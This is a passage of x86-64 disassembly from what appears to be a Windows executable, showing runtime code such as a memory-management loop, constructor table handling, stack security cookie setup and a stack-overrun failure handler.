  4096de:	49 8b bd c0 33 00 00 	mov    0x33c0(%r13),%rdi
  4096e5:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  4096e9:	48 39 de             	cmp    %rbx,%rsi
  4096ec:	7c 11                	jl     0x4096ff
  4096ee:	48 8b 14 df          	mov    (%rdi,%rbx,8),%rdx
  4096f2:	4c 89 e9             	mov    %r13,%rcx
  4096f5:	48 ff c3             	inc    %rbx
  4096f8:	e8 7f a9 ff ff       	call   0x40407c
  4096fd:	eb ea                	jmp    0x4096e9
  4096ff:	49 8d 85 10 29 00 00 	lea    0x2910(%r13),%rax
  409706:	41 c6 85 30 31 00 00 	movb   $0x1,0x3130(%r13)
  40970d:	01 
  40970e:	31 ed                	xor    %ebp,%ebp
  409710:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  409715:	49 8b b4 ed 10 29 00 	mov    0x2910(%r13,%rbp,8),%rsi
  40971c:	00 
  40971d:	48 85 f6             	test   %rsi,%rsi
  409720:	0f 84 fd 00 00 00    	je     0x409823
  409726:	31 ff                	xor    %edi,%edi
  409728:	4c 8b 64 fe 10       	mov    0x10(%rsi,%rdi,8),%r12
  40972d:	48 89 f8             	mov    %rdi,%rax
  409730:	48 c1 e0 06          	shl    $0x6,%rax
  409734:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  409739:	4d 85 e4             	test   %r12,%r12
  40973c:	0f 84 cc 00 00 00    	je     0x40980e
  409742:	41 f6 c4 01          	test   $0x1,%r12b
  409746:	0f 84 b5 00 00 00    	je     0x409801
  40974c:	48 8b 5e 08          	mov    0x8(%rsi),%rbx
  409750:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
  409755:	48 c1 e3 09          	shl    $0x9,%rbx
  409759:	48 0b 5c 24 28       	or     0x28(%rsp),%rbx
  40975e:	48 89 da             	mov    %rbx,%rdx
  409761:	e8 73 80 ff ff       	call   0x4017d9
  409766:	84 c0                	test   %al,%al
  409768:	0f 84 93 00 00 00    	je     0x409801
  40976e:	48 89 d8             	mov    %rbx,%rax
  409771:	48 c1 e0 0c          	shl    $0xc,%rax
  409775:	f6 00 01             	testb  $0x1,(%rax)
  409778:	0f 84 83 00 00 00    	je     0x409801
  40977e:	4c 8b 78 08          	mov    0x8(%rax),%r15
  409782:	49 81 ff c8 0f 00 00 	cmp    $0xfc8,%r15
  409789:	7f 47                	jg     0x4097d2
  40978b:	48 8d 58 38          	lea    0x38(%rax),%rbx
  40978f:	48 89 da             	mov    %rbx,%rdx
  409792:	48 03 50 30          	add    0x30(%rax),%rdx
  409796:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
  40979b:	48 39 5c 24 30       	cmp    %rbx,0x30(%rsp)
  4097a0:	76 5f                	jbe    0x409801
  4097a2:	48 83 7b 08 01       	cmpq   $0x1,0x8(%rbx)
  4097a7:	76 24                	jbe    0x4097cd
  4097a9:	48 89 da             	mov    %rbx,%rdx
  4097ac:	4c 89 f1             	mov    %r14,%rcx
  4097af:	e8 8c fa ff ff       	call   0x409240
  4097b4:	84 c0                	test   %al,%al
  4097b6:	75 15                	jne    0x4097cd
  4097b8:	48 89 d9             	mov    %rbx,%rcx
  4097bb:	e8 02 fc ff ff       	call   0x4093c2
  4097c0:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  4097c5:	48 89 da             	mov    %rbx,%rdx
  4097c8:	e8 65 9f ff ff       	call   0x403732
  4097cd:	4c 01 fb             	add    %r15,%rbx
  4097d0:	eb c9                	jmp    0x40979b
  4097d2:	48 83 78 28 01       	cmpq   $0x1,0x28(%rax)
  4097d7:	76 28                	jbe    0x409801
  4097d9:	48 8d 58 20          	lea    0x20(%rax),%rbx
  4097dd:	4c 89 f1             	mov    %r14,%rcx
  4097e0:	48 89 da             	mov    %rbx,%rdx
  4097e3:	e8 58 fa ff ff       	call   0x409240
  4097e8:	84 c0                	test   %al,%al
  4097ea:	75 15                	jne    0x409801
  4097ec:	48 89 d9             	mov    %rbx,%rcx
  4097ef:	e8 ce fb ff ff       	call   0x4093c2
  4097f4:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  4097f9:	48 89 da             	mov    %rbx,%rdx
  4097fc:	e8 31 9f ff ff       	call   0x403732
  409801:	48 ff 44 24 28       	incq   0x28(%rsp)
  409806:	49 d1 ec             	shr    $1,%r12
  409809:	e9 2b ff ff ff       	jmp    0x409739
  40980e:	48 ff c7             	inc    %rdi
  409811:	48 83 ff 08          	cmp    $0x8,%rdi
  409815:	0f 85 0d ff ff ff    	jne    0x409728
  40981b:	48 8b 36             	mov    (%rsi),%rsi
  40981e:	e9 fa fe ff ff       	jmp    0x40971d
  409823:	48 ff c5             	inc    %rbp
  409826:	48 81 fd 00 01 00 00 	cmp    $0x100,%rbp
  40982d:	0f 85 e2 fe ff ff    	jne    0x409715
  409833:	49 ff 85 60 33 00 00 	incq   0x3360(%r13)
  40983a:	41 c6 85 30 31 00 00 	movb   $0x0,0x3130(%r13)
  409841:	00 
  409842:	e8 d0 92 ff ff       	call   0x402b17
  409847:	ba 00 00 40 00       	mov    $0x400000,%edx
  40984c:	48 8b 80 38 29 00 00 	mov    0x2938(%rax),%rax
  409853:	48 01 c0             	add    %rax,%rax
  409856:	48 3d 00 00 40 00    	cmp    $0x400000,%rax
  40985c:	48 0f 4c c2          	cmovl  %rdx,%rax
  409860:	49 39 85 68 33 00 00 	cmp    %rax,0x3368(%r13)
  409867:	49 89 45 08          	mov    %rax,0x8(%r13)
  40986b:	49 0f 4d 85 68 33 00 	cmovge 0x3368(%r13),%rax
  409872:	00 
  409873:	49 89 85 68 33 00 00 	mov    %rax,0x3368(%r13)
  40987a:	49 8b 45 30          	mov    0x30(%r13),%rax
  40987e:	31 db                	xor    %ebx,%ebx
  409880:	49 8b 7d 40          	mov    0x40(%r13),%rdi
  409884:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  409888:	48 39 de             	cmp    %rbx,%rsi
  40988b:	7c 0e                	jl     0x40989b
  40988d:	48 8b 0c df          	mov    (%rdi,%rbx,8),%rcx
  409891:	48 ff c3             	inc    %rbx
  409894:	e8 6a a4 ff ff       	call   0x403d03
  409899:	eb ed                	jmp    0x409888
  40989b:	49 8b 45 18          	mov    0x18(%r13),%rax
  40989f:	ba f4 01 00 00       	mov    $0x1f4,%edx
  4098a4:	49 c7 45 30 00 00 00 	movq   $0x0,0x30(%r13)
  4098ab:	00 
  4098ac:	48 01 c0             	add    %rax,%rax
  4098af:	48 3d f4 01 00 00    	cmp    $0x1f4,%rax
  4098b5:	48 0f 4c c2          	cmovl  %rdx,%rax
  4098b9:	49 89 45 10          	mov    %rax,0x10(%r13)
  4098bd:	48 83 c4 48          	add    $0x48,%rsp
  4098c1:	5b                   	pop    %rbx
  4098c2:	5e                   	pop    %rsi
  4098c3:	5f                   	pop    %rdi
  4098c4:	5d                   	pop    %rbp
  4098c5:	41 5c                	pop    %r12
  4098c7:	41 5d                	pop    %r13
  4098c9:	41 5e                	pop    %r14
  4098cb:	41 5f                	pop    %r15
  4098cd:	c3                   	ret
  4098ce:	57                   	push   %rdi
  4098cf:	56                   	push   %rsi
  4098d0:	53                   	push   %rbx
  4098d1:	48 83 ec 20          	sub    $0x20,%rsp
  4098d5:	4c 89 c6             	mov    %r8,%rsi
  4098d8:	48 89 d3             	mov    %rdx,%rbx
  4098db:	48 89 cf             	mov    %rcx,%rdi
  4098de:	4c 89 c1             	mov    %r8,%rcx
  4098e1:	e8 7a fb ff ff       	call   0x409460
  4098e6:	48 8d 53 10          	lea    0x10(%rbx),%rdx
  4098ea:	48 8d 4e 68          	lea    0x68(%rsi),%rcx
  4098ee:	e8 5a 85 ff ff       	call   0x401e4d
  4098f3:	48 8b 56 28          	mov    0x28(%rsi),%rdx
  4098f7:	48 89 c3             	mov    %rax,%rbx
  4098fa:	48 89 78 08          	mov    %rdi,0x8(%rax)
  4098fe:	48 c7 00 04 00 00 00 	movq   $0x4,(%rax)
  409905:	48 8b 46 18          	mov    0x18(%rsi),%rax
  409909:	48 83 f8 08          	cmp    $0x8,%rax
  40990d:	0f 8e b2 00 00 00    	jle    0x4099c5
  409913:	48 c1 e0 03          	shl    $0x3,%rax
  409917:	4c 8d 44 02 f8       	lea    -0x8(%rdx,%rax,1),%r8
  40991c:	4d 8b 08             	mov    (%r8),%r9
  40991f:	49 8b 09             	mov    (%r9),%rcx
  409922:	48 83 f9 07          	cmp    $0x7,%rcx
  409926:	77 66                	ja     0x40998e
  409928:	4c 8d 44 02 f0       	lea    -0x10(%rdx,%rax,1),%r8
  40992d:	4d 8b 08             	mov    (%r8),%r9
  409930:	49 8b 09             	mov    (%r9),%rcx
  409933:	48 83 f9 07          	cmp    $0x7,%rcx
  409937:	77 55                	ja     0x40998e
  409939:	4c 8d 44 02 e8       	lea    -0x18(%rdx,%rax,1),%r8
  40993e:	4d 8b 08             	mov    (%r8),%r9
  409941:	49 8b 09             	mov    (%r9),%rcx
  409944:	48 83 f9 07          	cmp    $0x7,%rcx
  409948:	77 44                	ja     0x40998e
  40994a:	4c 8d 44 02 e0       	lea    -0x20(%rdx,%rax,1),%r8
  40994f:	4d 8b 08             	mov    (%r8),%r9
  409952:	49 8b 09             	mov    (%r9),%rcx
  409955:	48 83 f9 07          	cmp    $0x7,%rcx
  409959:	77 33                	ja     0x40998e
  40995b:	4c 8d 44 02 d8       	lea    -0x28(%rdx,%rax,1),%r8
  409960:	4d 8b 08             	mov    (%r8),%r9
  409963:	49 8b 09             	mov    (%r9),%rcx
  409966:	48 83 f9 07          	cmp    $0x7,%rcx
  40996a:	77 22                	ja     0x40998e
  40996c:	4c 8d 44 02 d0       	lea    -0x30(%rdx,%rax,1),%r8
  409971:	4d 8b 08             	mov    (%r8),%r9
  409974:	49 8b 09             	mov    (%r9),%rcx
  409977:	48 83 f9 07          	cmp    $0x7,%rcx
  40997b:	77 11                	ja     0x40998e
  40997d:	4c 8d 44 02 c8       	lea    -0x38(%rdx,%rax,1),%r8
  409982:	4d 8b 08             	mov    (%r8),%r9
  409985:	49 8b 09             	mov    (%r9),%rcx
  409988:	48 83 f9 07          	cmp    $0x7,%rcx
  40998c:	76 0c                	jbe    0x40999a
  40998e:	48 83 e1 fb          	and    $0xfffffffffffffffb,%rcx
  409992:	49 89 09             	mov    %rcx,(%r9)
  409995:	49 89 18             	mov    %rbx,(%r8)
  409998:	eb 36                	jmp    0x4099d0
  40999a:	48 8d 54 02 c0       	lea    -0x40(%rdx,%rax,1),%rdx
  40999f:	48 8b 0a             	mov    (%rdx),%rcx
  4099a2:	48 8b 01             	mov    (%rcx),%rax
  4099a5:	48 83 f8 07          	cmp    $0x7,%rax
  4099a9:	76 0c                	jbe    0x4099b7
  4099ab:	48 83 e0 fb          	and    $0xfffffffffffffffb,%rax
  4099af:	48 89 01             	mov    %rax,(%rcx)
  4099b2:	48 89 1a             	mov    %rbx,(%rdx)
  4099b5:	eb 19                	jmp    0x4099d0
  4099b7:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
  4099bb:	48 89 da             	mov    %rbx,%rdx
  4099be:	e8 72 a0 ff ff       	call   0x403a35
  4099c3:	eb 0b                	jmp    0x4099d0
  4099c5:	48 89 1c c2          	mov    %rbx,(%rdx,%rax,8)
  4099c9:	48 ff c0             	inc    %rax
  4099cc:	48 89 46 18          	mov    %rax,0x18(%rsi)
  4099d0:	48 8d 43 10          	lea    0x10(%rbx),%rax
  4099d4:	48 83 c4 20          	add    $0x20,%rsp
  4099d8:	5b                   	pop    %rbx
  4099d9:	5e                   	pop    %rsi
  4099da:	5f                   	pop    %rdi
  4099db:	c3                   	ret
  4099dc:	53                   	push   %rbx
  4099dd:	48 83 ec 20          	sub    $0x20,%rsp
  4099e1:	bb 07 00 00 00       	mov    $0x7,%ebx
  4099e6:	48 83 f9 07          	cmp    $0x7,%rcx
  4099ea:	48 0f 4d d9          	cmovge %rcx,%rbx
  4099ee:	e8 24 91 ff ff       	call   0x402b17
  4099f3:	48 8b 0d 96 e0 00 00 	mov    0xe096(%rip),%rcx        # 0x417a90
  4099fa:	48 8d 53 11          	lea    0x11(%rbx),%rdx
  4099fe:	4c 8d 40 38          	lea    0x38(%rax),%r8
  409a02:	e8 c7 fe ff ff       	call   0x4098ce
  409a07:	48 89 58 08          	mov    %rbx,0x8(%rax)
  409a0b:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  409a12:	48 83 c4 20          	add    $0x20,%rsp
  409a16:	5b                   	pop    %rbx
  409a17:	c3                   	ret
  409a18:	57                   	push   %rdi
  409a19:	56                   	push   %rsi
  409a1a:	53                   	push   %rbx
  409a1b:	48 83 ec 20          	sub    $0x20,%rsp
  409a1f:	31 c0                	xor    %eax,%eax
  409a21:	48 85 c9             	test   %rcx,%rcx
  409a24:	48 89 ce             	mov    %rcx,%rsi
  409a27:	74 2a                	je     0x409a53
  409a29:	48 89 f7             	mov    %rsi,%rdi
  409a2c:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  409a30:	f2 ae                	repnz scas (%rdi),%al
  409a32:	48 89 cb             	mov    %rcx,%rbx
  409a35:	48 f7 d3             	not    %rbx
  409a38:	48 8d 7b ff          	lea    -0x1(%rbx),%rdi
  409a3c:	48 89 f9             	mov    %rdi,%rcx
  409a3f:	e8 98 ff ff ff       	call   0x4099dc
  409a44:	48 89 d9             	mov    %rbx,%rcx
  409a47:	48 8d 50 10          	lea    0x10(%rax),%rdx
  409a4b:	48 89 38             	mov    %rdi,(%rax)
  409a4e:	48 89 d7             	mov    %rdx,%rdi
  409a51:	f3 a4                	rep movsb (%rsi),(%rdi)
  409a53:	48 83 c4 20          	add    $0x20,%rsp
  409a57:	5b                   	pop    %rbx
  409a58:	5e                   	pop    %rsi
  409a59:	5f                   	pop    %rdi
  409a5a:	c3                   	ret
  409a5b:	90                   	nop
  409a5c:	90                   	nop
  409a5d:	90                   	nop
  409a5e:	90                   	nop
  409a5f:	90                   	nop
  409a60:	53                   	push   %rbx
  409a61:	48 83 ec 30          	sub    $0x30,%rsp
  409a65:	48 89 cb             	mov    %rcx,%rbx
  409a68:	48 8b 0d 71 05 03 00 	mov    0x30571(%rip),%rcx        # 0x439fe0
  409a6f:	e8 9c 05 00 00       	call   0x40a010
  409a74:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
  409a78:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  409a7d:	74 76                	je     0x409af5
  409a7f:	b9 08 00 00 00       	mov    $0x8,%ecx
  409a84:	e8 d7 1b 00 00       	call   0x40b660
  409a89:	48 8b 0d 50 05 03 00 	mov    0x30550(%rip),%rcx        # 0x439fe0
  409a90:	e8 7b 05 00 00       	call   0x40a010
  409a95:	48 8b 0d 4c 05 03 00 	mov    0x3054c(%rip),%rcx        # 0x439fe8
  409a9c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  409aa1:	e8 6a 05 00 00       	call   0x40a010
  409aa6:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  409aab:	48 89 d9             	mov    %rbx,%rcx
  409aae:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
  409ab3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  409ab8:	e8 0b 1c 00 00       	call   0x40b6c8
  409abd:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  409ac2:	48 89 c3             	mov    %rax,%rbx
  409ac5:	e8 56 05 00 00       	call   0x40a020
  409aca:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  409acf:	48 89 05 0a 05 03 00 	mov    %rax,0x3050a(%rip)        # 0x439fe0
  409ad6:	e8 45 05 00 00       	call   0x40a020
  409adb:	b9 08 00 00 00       	mov    $0x8,%ecx
  409ae0:	48 89 05 01 05 03 00 	mov    %rax,0x30501(%rip)        # 0x439fe8
  409ae7:	e8 4c 1b 00 00       	call   0x40b638
  409aec:	48 89 d8             	mov    %rbx,%rax
  409aef:	48 83 c4 30          	add    $0x30,%rsp
  409af3:	5b                   	pop    %rbx
  409af4:	c3                   	ret
  409af5:	48 8b 05 94 dd 00 00 	mov    0xdd94(%rip),%rax        # 0x417890
  409afc:	48 89 d9             	mov    %rbx,%rcx
  409aff:	ff 10                	call   *(%rax)
  409b01:	48 89 c3             	mov    %rax,%rbx
  409b04:	48 89 d8             	mov    %rbx,%rax
  409b07:	48 83 c4 30          	add    $0x30,%rsp
  409b0b:	5b                   	pop    %rbx
  409b0c:	c3                   	ret
  409b0d:	0f 1f 00             	nopl   (%rax)
  409b10:	48 83 ec 28          	sub    $0x28,%rsp
  409b14:	e8 47 ff ff ff       	call   0x409a60
  409b19:	48 85 c0             	test   %rax,%rax
  409b1c:	0f 94 c0             	sete   %al
  409b1f:	0f b6 c0             	movzbl %al,%eax
  409b22:	f7 d8                	neg    %eax
  409b24:	48 83 c4 28          	add    $0x28,%rsp
  409b28:	c3                   	ret
  409b29:	90                   	nop
  409b2a:	90                   	nop
  409b2b:	90                   	nop
  409b2c:	90                   	nop
  409b2d:	90                   	nop
  409b2e:	90                   	nop
  409b2f:	90                   	nop
  409b30:	48 83 ec 28          	sub    $0x28,%rsp
  409b34:	48 8b 05 45 45 00 00 	mov    0x4545(%rip),%rax        # 0x40e080
  409b3b:	48 8b 00             	mov    (%rax),%rax
  409b3e:	48 85 c0             	test   %rax,%rax
  409b41:	74 1d                	je     0x409b60
  409b43:	ff d0                	call   *%rax
  409b45:	48 8b 05 34 45 00 00 	mov    0x4534(%rip),%rax        # 0x40e080
  409b4c:	48 8d 50 08          	lea    0x8(%rax),%rdx
  409b50:	48 8b 40 08          	mov    0x8(%rax),%rax
  409b54:	48 89 15 25 45 00 00 	mov    %rdx,0x4525(%rip)        # 0x40e080
  409b5b:	48 85 c0             	test   %rax,%rax
  409b5e:	75 e3                	jne    0x409b43
  409b60:	48 83 c4 28          	add    $0x28,%rsp
  409b64:	c3                   	ret
  409b65:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  409b6c:	00 00 00 00 
  409b70:	56                   	push   %rsi
  409b71:	53                   	push   %rbx
  409b72:	48 83 ec 28          	sub    $0x28,%rsp
  409b76:	48 8b 0d 83 dc 00 00 	mov    0xdc83(%rip),%rcx        # 0x417800
  409b7d:	48 8b 11             	mov    (%rcx),%rdx
  409b80:	83 fa ff             	cmp    $0xffffffff,%edx
  409b83:	89 d0                	mov    %edx,%eax
  409b85:	74 39                	je     0x409bc0
  409b87:	85 c0                	test   %eax,%eax
  409b89:	74 20                	je     0x409bab
  409b8b:	89 c2                	mov    %eax,%edx
  409b8d:	83 e8 01             	sub    $0x1,%eax
  409b90:	48 8d 1c d1          	lea    (%rcx,%rdx,8),%rbx
  409b94:	48 29 c2             	sub    %rax,%rdx
  409b97:	48 8d 74 d1 f8       	lea    -0x8(%rcx,%rdx,8),%rsi
  409b9c:	0f 1f 40 00          	nopl   0x0(%rax)
  409ba0:	ff 13                	call   *(%rbx)
  409ba2:	48 83 eb 08          	sub    $0x8,%rbx
  409ba6:	48 39 f3             	cmp    %rsi,%rbx
  409ba9:	75 f5                	jne    0x409ba0
  409bab:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 0x409b30
  409bb2:	48 83 c4 28          	add    $0x28,%rsp
  409bb6:	5b                   	pop    %rbx
  409bb7:	5e                   	pop    %rsi
  409bb8:	e9 53 ff ff ff       	jmp    0x409b10
  409bbd:	0f 1f 00             	nopl   (%rax)
  409bc0:	31 c0                	xor    %eax,%eax
  409bc2:	eb 02                	jmp    0x409bc6
  409bc4:	89 d0                	mov    %edx,%eax
  409bc6:	44 8d 40 01          	lea    0x1(%rax),%r8d
  409bca:	4a 83 3c c1 00       	cmpq   $0x0,(%rcx,%r8,8)
  409bcf:	4c 89 c2             	mov    %r8,%rdx
  409bd2:	75 f0                	jne    0x409bc4
  409bd4:	eb b1                	jmp    0x409b87
  409bd6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  409bdd:	00 00 00 
  409be0:	8b 05 1a af 02 00    	mov    0x2af1a(%rip),%eax        # 0x434b00
  409be6:	85 c0                	test   %eax,%eax
  409be8:	74 06                	je     0x409bf0
  409bea:	c3                   	ret
  409beb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  409bf0:	c7 05 06 af 02 00 01 	movl   $0x1,0x2af06(%rip)        # 0x434b00
  409bf7:	00 00 00 
  409bfa:	e9 71 ff ff ff       	jmp    0x409b70
  409bff:	90                   	nop
  409c00:	48 ff 25 3d 18 03 00 	rex.W jmp *0x3183d(%rip)        # 0x43b444
  409c07:	90                   	nop
  409c08:	90                   	nop
  409c09:	90                   	nop
  409c0a:	90                   	nop
  409c0b:	90                   	nop
  409c0c:	90                   	nop
  409c0d:	90                   	nop
  409c0e:	90                   	nop
  409c0f:	90                   	nop
  409c10:	31 c0                	xor    %eax,%eax
  409c12:	c3                   	ret
  409c13:	90                   	nop
  409c14:	90                   	nop
  409c15:	90                   	nop
  409c16:	90                   	nop
  409c17:	90                   	nop
  409c18:	90                   	nop
  409c19:	90                   	nop
  409c1a:	90                   	nop
  409c1b:	90                   	nop
  409c1c:	90                   	nop
  409c1d:	90                   	nop
  409c1e:	90                   	nop
  409c1f:	90                   	nop
  409c20:	41 54                	push   %r12
  409c22:	55                   	push   %rbp
  409c23:	57                   	push   %rdi
  409c24:	56                   	push   %rsi
  409c25:	53                   	push   %rbx
  409c26:	48 83 ec 40          	sub    $0x40,%rsp
  409c2a:	48 8b 1d bf 44 00 00 	mov    0x44bf(%rip),%rbx        # 0x40e0f0
  409c31:	48 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rax
  409c38:	2b 00 00 
  409c3b:	48 39 c3             	cmp    %rax,%rbx
  409c3e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  409c45:	00 00 
  409c47:	74 17                	je     0x409c60
  409c49:	48 f7 d3             	not    %rbx
  409c4c:	48 89 1d ad 44 00 00 	mov    %rbx,0x44ad(%rip)        # 0x40e100
  409c53:	48 83 c4 40          	add    $0x40,%rsp
  409c57:	5b                   	pop    %rbx
  409c58:	5e                   	pop    %rsi
  409c59:	5f                   	pop    %rdi
  409c5a:	5d                   	pop    %rbp
  409c5b:	41 5c                	pop    %r12
  409c5d:	c3                   	ret
  409c5e:	66 90                	xchg   %ax,%ax
  409c60:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  409c65:	ff 15 e9 16 03 00    	call   *0x316e9(%rip)        # 0x43b354
  409c6b:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
  409c70:	ff 15 ae 16 03 00    	call   *0x316ae(%rip)        # 0x43b324
  409c76:	41 89 c4             	mov    %eax,%r12d
  409c79:	ff 15 ad 16 03 00    	call   *0x316ad(%rip)        # 0x43b32c
  409c7f:	89 c5                	mov    %eax,%ebp
  409c81:	ff 15 d5 16 03 00    	call   *0x316d5(%rip)        # 0x43b35c
  409c87:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  409c8c:	89 c6                	mov    %eax,%esi
  409c8e:	ff 15 e8 16 03 00    	call   *0x316e8(%rip)        # 0x43b37c
  409c94:	48 33 7c 24 30       	xor    0x30(%rsp),%rdi
  409c99:	44 89 e0             	mov    %r12d,%eax
  409c9c:	48 ba ff ff ff ff ff 	movabs $0xffffffffffff,%rdx
  409ca3:	ff 00 00 
  409ca6:	48 31 f8             	xor    %rdi,%rax
  409ca9:	89 ef                	mov    %ebp,%edi
  409cab:	48 31 c7             	xor    %rax,%rdi
  409cae:	89 f0                	mov    %esi,%eax
  409cb0:	48 31 f8             	xor    %rdi,%rax
  409cb3:	48 21 d0             	and    %rdx,%rax
  409cb6:	48 39 d8             	cmp    %rbx,%rax
  409cb9:	74 25                	je     0x409ce0
  409cbb:	48 89 c2             	mov    %rax,%rdx
  409cbe:	48 f7 d2             	not    %rdx
  409cc1:	48 89 05 28 44 00 00 	mov    %rax,0x4428(%rip)        # 0x40e0f0
  409cc8:	48 89 15 31 44 00 00 	mov    %rdx,0x4431(%rip)        # 0x40e100
  409ccf:	48 83 c4 40          	add    $0x40,%rsp
  409cd3:	5b                   	pop    %rbx
  409cd4:	5e                   	pop    %rsi
  409cd5:	5f                   	pop    %rdi
  409cd6:	5d                   	pop    %rbp
  409cd7:	41 5c                	pop    %r12
  409cd9:	c3                   	ret
  409cda:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  409ce0:	48 ba cc 5d 20 d2 66 	movabs $0xffffd466d2205dcc,%rdx
  409ce7:	d4 ff ff 
  409cea:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
  409cf1:	2b 00 00 
  409cf4:	eb cb                	jmp    0x409cc1
  409cf6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  409cfd:	00 00 00 
  409d00:	55                   	push   %rbp
  409d01:	56                   	push   %rsi
  409d02:	53                   	push   %rbx
  409d03:	48 89 e5             	mov    %rsp,%rbp
  409d06:	48 83 ec 70          	sub    $0x70,%rsp
  409d0a:	48 89 ce             	mov    %rcx,%rsi
  409d0d:	48 8d 0d 0c ae 02 00 	lea    0x2ae0c(%rip),%rcx        # 0x434b20
  409d14:	ff 15 72 16 03 00    	call   *0x31672(%rip)        # 0x43b38c
  409d1a:	48 8b 1d f7 ae 02 00 	mov    0x2aef7(%rip),%rbx        # 0x434c18
  409d21:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
  409d25:	45 31 c0             	xor    %r8d,%r8d
  409d28:	48 89 d9             	mov    %rbx,%rcx
  409d2b:	ff 15 63 16 03 00    	call   *0x31663(%rip)        # 0x43b394
  409d31:	48 85 c0             	test   %rax,%rax
  409d34:	49 89 c1             	mov    %rax,%r9
  409d37:	0f 84 a3 00 00 00    	je     0x409de0
  409d3d:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  409d41:	49 89 d8             	mov    %rbx,%r8
  409d44:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  409d48:	31 c9                	xor    %ecx,%ecx
  409d4a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  409d4f:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  409d53:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  409d58:	48 8d 05 c1 ad 02 00 	lea    0x2adc1(%rip),%rax        # 0x434b20
  409d5f:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  409d66:	00 00 
  409d68:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  409d6d:	ff 15 29 16 03 00    	call   *0x31629(%rip)        # 0x43b39c
  409d73:	48 8b 05 9e ae 02 00 	mov    0x2ae9e(%rip),%rax        # 0x434c18
  409d7a:	31 c9                	xor    %ecx,%ecx
  409d7c:	48 89 35 1d ae 02 00 	mov    %rsi,0x2ae1d(%rip)        # 0x434ba0
  409d83:	c7 05 73 b2 02 00 09 	movl   $0xc0000409,0x2b273(%rip)        # 0x435000
  409d8a:	04 00 c0 
  409d8d:	c7 05 6d b2 02 00 01 	movl   $0x1,0x2b26d(%rip)        # 0x435004
  409d94:	00 00 00 
  409d97:	48 89 05 72 b2 02 00 	mov    %rax,0x2b272(%rip)        # 0x435010
  409d9e:	48 8b 05 4b 43 00 00 	mov    0x434b(%rip),%rax        # 0x40e0f0
  409da5:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  409da9:	48 8b 05 50 43 00 00 	mov    0x4350(%rip),%rax        # 0x40e100
  409db0:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  409db4:	ff 15 f2 15 03 00    	call   *0x315f2(%rip)        # 0x43b3ac
  409dba:	48 8d 0d bf ce 00 00 	lea    0xcebf(%rip),%rcx        # 0x416c80
  409dc1:	ff 15 1d 16 03 00    	call   *0x3161d(%rip)        # 0x43b3e4
  409dc7:	ff 15 4f 15 03 00    	call   *0x3154f(%rip)        # 0x43b31c
  409dcd:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
  409dd2:	48 89 c1             	mov    %rax,%rcx
  409dd5:	ff 15 e1 15 03 00    	call   *0x315e1(%rip)        # 0x43b3bc
  409ddb:	e8 40 18 00 00       	call   0x40b620
  409de0:	48 8b 45 18          	mov    0x18(%rbp),%rax
  409de4:	48 89 05 2d ae 02 00 	mov    %rax,0x2ae2d(%rip)        # 0x434c18
  409deb:	48 8d 45 08          	lea    0x8(%rbp),%rax
  409def:	48 89 05 c2 ad 02 00 	mov    %rax,0x2adc2(%rip)        # 0x434bb8
  409df6:	e9 78 ff ff ff       	jmp    0x409d73
  409dfb:	90                   	nop
  409dfc:	90                   	nop
  409dfd:	90                   	nop
  409dfe:	90                   	nop
  409dff:	90                   	nop
  409e00:	48 83 ec 28          	sub    $0x28,%rsp
  409e04:	83 fa 03             	cmp    $0x3,%edx
  409e07:	74 17                	je     0x409e20
  409e09:	85 d2                	test   %edx,%edx
  409e0b:	74 13                	je     0x409e20
  409e0d:	b8 01 00 00 00       	mov    $0x1,%eax
  409e12:	48 83 c4 28          	add    $0x28,%rsp
  409e16:	c3                   	ret
  409e17:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  409e1e:	00 00 
  409e20:	e8 db 0c 00 00       	call   0x40ab00
  409e25:	b8 01 00 00 00       	mov    $0x1,%eax
  409e2a:	48 83 c4 28          	add    $0x28,%rsp
  409e2e:	c3                   	ret
  409e2f:	90                   	nop
  409e30:	56                   	push   %rsi
  409e31:	53                   	push   %rbx
  409e32:	48 83 ec 28          	sub    $0x28,%rsp
  409e36:	48 8b 05 a3 d9 00 00 	mov    0xd9a3(%rip),%rax        # 0x4177e0
